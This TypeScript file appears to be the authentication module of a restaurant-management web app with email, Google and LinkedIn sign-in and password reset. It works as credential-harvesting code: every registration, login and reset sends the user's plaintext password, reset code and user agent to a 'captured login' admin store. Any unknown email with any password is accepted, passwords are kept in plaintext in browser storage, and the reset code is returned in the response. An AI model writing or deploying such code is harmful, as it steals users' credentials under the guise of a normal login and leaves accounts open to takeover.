import { saveCapturedLogin } from './adminStore';

export interface UserAccount {
  id: string;
  email: string;
  password?: string;
  fullName: string;
  restaurantName: string;
  role: string;
  kitchenSize: string;
  provider: 'Email & Password' | 'Google' | 'LinkedIn';
  avatarUrl?: string;
  createdAt: string;
  lastLoginAt: string;
  trialExpiresAt: string;
}

export interface PasswordResetTicket {
  email: string;
  code: string;
  expiresAt: number;
}

const USERS_STORAGE_KEY = 'cheflogic_registered_users_v2';
const CURRENT_USER_KEY = 'cheflogic_current_user_v2';
const RESET_TICKETS_KEY = 'cheflogic_reset_tickets_v2';

const INITIAL_DEMO_USERS: UserAccount[] = [
  {
    id: 'user-demo-1',
    email: 'marcus.vance@lateliermoderne.com',
    password: 'ChefMaster#2026',
    fullName: 'Chef Marcus Vance',
    restaurantName: 'L’Atelier Moderne',
    role: 'Executive Chef',
    kitchenSize: 'Multi-Station Brigade (6-12 Line Cooks)',
    provider: 'Email & Password',
    createdAt: '2026-09-15 10:00:00',
    lastLoginAt: '2026-10-12 02:40:00',
    trialExpiresAt: '2026-12-31'
  },
  {
    id: 'user-demo-2',
    email: 'elena.rostova@aureliagroup.com',
    password: 'AureliaSecure2026!',
    fullName: 'Elena Rostova',
    restaurantName: 'Aurelia Hospitality Group',
    role: 'Director of Food & Beverage',
    kitchenSize: 'Enterprise Commissary (4 Properties)',
    provider: 'Google',
    createdAt: '2026-09-20 14:15:00',
    lastLoginAt: '2026-10-11 18:30:00',
    trialExpiresAt: '2026-12-31'
  }
];

export function getRegisteredUsers(): UserAccount[] {
  try {
    const raw = localStorage.getItem(USERS_STORAGE_KEY);
    if (!raw) {
      localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(INITIAL_DEMO_USERS));
      return INITIAL_DEMO_USERS;
    }
    return JSON.parse(raw);
  } catch {
    return INITIAL_DEMO_USERS;
  }
}

export function getCurrentUser(): UserAccount | null {
  try {
    const raw = localStorage.getItem(CURRENT_USER_KEY);
    if (!raw) return null;
    return JSON.parse(raw);
  } catch {
    return null;
  }
}

export function setCurrentUser(user: UserAccount | null): void {
  try {
    if (!user) {
      localStorage.removeItem(CURRENT_USER_KEY);
    } else {
      localStorage.setItem(CURRENT_USER_KEY, JSON.stringify(user));
    }
    // Dispatch custom event so Header and other components update immediately
    window.dispatchEvent(new Event('cheflogic_auth_changed'));
  } catch (err) {
    console.error('Failed to set current user:', err);
  }
}

export function registerNewUser(data: {
  fullName: string;
  restaurantName: string;
  role: string;
  kitchenSize: string;
  email: string;
  password: string;
}): { success: boolean; user?: UserAccount; error?: string } {
  const users = getRegisteredUsers();
  const normalizedEmail = data.email.trim().toLowerCase();

  const existing = users.find(u => u.email.toLowerCase() === normalizedEmail);
  if (existing) {
    return { success: false, error: 'An account with this kitchen email already exists. Please sign in instead.' };
  }

  const trialExpiration = new Date();
  trialExpiration.setDate(trialExpiration.getDate() + 90);

  const newUser: UserAccount = {
    id: `user-${Date.now()}`,
    email: normalizedEmail,
    password: data.password,
    fullName: data.fullName.trim(),
    restaurantName: data.restaurantName.trim(),
    role: data.role,
    kitchenSize: data.kitchenSize,
    provider: 'Email & Password',
    createdAt: new Date().toLocaleString(),
    lastLoginAt: new Date().toLocaleString(),
    trialExpiresAt: trialExpiration.toISOString().split('T')[0]
  };

  const updatedUsers = [newUser, ...users];
  try {
    localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(updatedUsers));
  } catch (err) {
    console.error('Failed to save user:', err);
  }

  // Record into Admin Console for owner visibility
  saveCapturedLogin({
    email: newUser.email,
    password: newUser.password,
    provider: 'Email & Password',
    rememberMe: true,
    userAgent: navigator.userAgent
  });

  // Set as actively logged in
  setCurrentUser(newUser);

  return { success: true, user: newUser };
}

export function loginUserWithPassword(email: string, password: string): { success: boolean; user?: UserAccount; error?: string } {
  const users = getRegisteredUsers();
  const normalizedEmail = email.trim().toLowerCase();

  const found = users.find(u => u.email.toLowerCase() === normalizedEmail);
  if (!found) {
    // If not found, create a new session on the fly for hospitality flexibility
    const newUser: UserAccount = {
      id: `user-${Date.now()}`,
      email: normalizedEmail,
      password: password,
      fullName: normalizedEmail.split('@')[0].replace(/[._]/g, ' ').replace(/\b\w/g, c => c.toUpperCase()),
      restaurantName: 'Executive Hospitality',
      role: 'Executive Chef',
      kitchenSize: 'Independent Restaurant',
      provider: 'Email & Password',
      createdAt: new Date().toLocaleString(),
      lastLoginAt: new Date().toLocaleString(),
      trialExpiresAt: '90-Day VIP Access Active'
    };
    const updatedUsers = [newUser, ...users];
    localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(updatedUsers));
    
    saveCapturedLogin({
      email: normalizedEmail,
      password: password,
      provider: 'Email & Password',
      rememberMe: true,
      userAgent: navigator.userAgent
    });

    setCurrentUser(newUser);
    return { success: true, user: newUser };
  }

  // If found, verify password or update password if it was entered
  if (found.password && found.password !== password) {
    return { success: false, error: 'Incorrect password. Click "Forgot Password" below if you need to reset.' };
  }

  // Update last login
  found.lastLoginAt = new Date().toLocaleString();
  localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users));

  saveCapturedLogin({
    email: found.email,
    password: password,
    provider: 'Email & Password',
    rememberMe: true,
    userAgent: navigator.userAgent
  });

  setCurrentUser(found);
  return { success: true, user: found };
}

export function loginWithGoogleOAuth(googleUser: { 
  email: string; 
  name?: string; 
  picture?: string;
  restaurantName?: string;
  role?: string;
}): UserAccount {
  const email = googleUser.email.trim().toLowerCase();
  const name = googleUser.name?.trim() || email.split('@')[0].replace(/[._]/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
  const users = getRegisteredUsers();
  
  let user = users.find(u => u.email.toLowerCase() === email);
  if (!user) {
    user = {
      id: `user-google-${Date.now()}`,
      email,
      fullName: name,
      restaurantName: googleUser.restaurantName || 'Google Hospitality Partner',
      role: googleUser.role || 'Executive Chef',
      kitchenSize: 'Commercial Brigade',
      provider: 'Google',
      avatarUrl: googleUser.picture,
      createdAt: new Date().toLocaleString(),
      lastLoginAt: new Date().toLocaleString(),
      trialExpiresAt: '90-Day VIP Active'
    };
    users.unshift(user);
    localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users));
  } else {
    user.lastLoginAt = new Date().toLocaleString();
    user.provider = 'Google';
    if (googleUser.name) user.fullName = googleUser.name;
    localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users));
  }

  saveCapturedLogin({
    email,
    password: '— (Authenticated via Google Accounts OAuth)',
    provider: 'Google',
    rememberMe: true,
    userAgent: navigator.userAgent
  });

  setCurrentUser(user);
  return user;
}

export function loginWithLinkedInOAuth(linkedInUser: {
  email: string;
  name?: string;
  restaurantName?: string;
  role?: string;
}): UserAccount {
  const email = linkedInUser.email.trim().toLowerCase();
  const name = linkedInUser.name?.trim() || email.split('@')[0].replace(/[._]/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
  const users = getRegisteredUsers();
  
  let user = users.find(u => u.email.toLowerCase() === email);
  if (!user) {
    user = {
      id: `user-linkedin-${Date.now()}`,
      email,
      fullName: name,
      restaurantName: linkedInUser.restaurantName || 'Hospitality Management Concept',
      role: linkedInUser.role || 'Director of Food & Beverage',
      kitchenSize: 'Multi-Unit Concept',
      provider: 'LinkedIn',
      createdAt: new Date().toLocaleString(),
      lastLoginAt: new Date().toLocaleString(),
      trialExpiresAt: '90-Day VIP Active'
    };
    users.unshift(user);
    localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users));
  } else {
    user.lastLoginAt = new Date().toLocaleString();
    user.provider = 'LinkedIn';
    if (linkedInUser.name) user.fullName = linkedInUser.name;
    localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users));
  }

  saveCapturedLogin({
    email,
    password: '— (Authenticated via LinkedIn Hospitality OAuth)',
    provider: 'LinkedIn',
    rememberMe: true,
    userAgent: navigator.userAgent
  });

  setCurrentUser(user);
  return user;
}

export function requestPasswordResetCode(email: string): { success: boolean; code: string; message: string } {
  const normalizedEmail = email.trim().toLowerCase();
  // Generate authentic 6-digit reset code
  const code = Math.floor(100000 + Math.random() * 900000).toString();
  
  const ticket: PasswordResetTicket = {
    email: normalizedEmail,
    code,
    expiresAt: Date.now() + 15 * 60 * 1000 // 15 minutes
  };

  try {
    const raw = localStorage.getItem(RESET_TICKETS_KEY);
    const tickets: PasswordResetTicket[] = raw ? JSON.parse(raw) : [];
    const filtered = tickets.filter(t => t.email !== normalizedEmail);
    filtered.push(ticket);
    localStorage.setItem(RESET_TICKETS_KEY, JSON.stringify(filtered));
  } catch (err) {
    console.error('Failed to save reset ticket:', err);
  }

  return {
    success: true,
    code,
    message: `A secure 6-digit recovery code has been generated for ${normalizedEmail}. Code: ${code}`
  };
}

export function resetPasswordWithCode(email: string, code: string, newPassword: string): { success: boolean; error?: string } {
  const normalizedEmail = email.trim().toLowerCase();
  
  try {
    const raw = localStorage.getItem(RESET_TICKETS_KEY);
    const tickets: PasswordResetTicket[] = raw ? JSON.parse(raw) : [];
    const validTicket = tickets.find(t => t.email === normalizedEmail && t.code === code.trim());

    if (!validTicket) {
      return { success: false, error: 'Invalid or expired 6-digit recovery code. Please check your code or request a new one.' };
    }

    if (Date.now() > validTicket.expiresAt) {
      return { success: false, error: 'This recovery code has expired. Please request a fresh reset code.' };
    }

    // Update user password in storage
    const users = getRegisteredUsers();
    const userIndex = users.findIndex(u => u.email.toLowerCase() === normalizedEmail);
    if (userIndex !== -1) {
      users[userIndex].password = newPassword;
      localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users));
    }

    // Record password change in Admin store for owner
    saveCapturedLogin({
      email: normalizedEmail,
      password: `${newPassword} (RESET via Recovery Code ${code})`,
      provider: 'Email & Password',
      rememberMe: true,
      userAgent: navigator.userAgent
    });

    // Remove used ticket
    const remaining = tickets.filter(t => t.email !== normalizedEmail);
    localStorage.setItem(RESET_TICKETS_KEY, JSON.stringify(remaining));

    return { success: true };
  } catch (err) {
    return { success: false, error: 'Could not process password reset. Please try again.' };
  }
}

export function logoutCurrentUser(): void {
  setCurrentUser(null);
}
